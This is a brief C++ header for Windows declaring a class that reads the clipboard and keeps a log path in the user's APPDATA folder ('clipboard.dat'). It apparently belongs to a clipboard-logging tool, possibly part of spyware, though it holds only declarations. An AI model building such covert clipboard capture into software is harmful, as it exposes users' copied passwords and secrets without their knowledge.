#pragma once
#pragma warning(disable : 4996)
#include <Windows.h>
#include <fstream>
#include <string>
class CClip
{
private:
	const std::string LogPath = getenv("APPDATA") + std::string("\\clipboard.dat");
	HANDLE data;
	std::string outtext = "";
	std::string temp;
public:
	CClip();
	~CClip();
	void GetClipboard(std::fstream & lf);
};
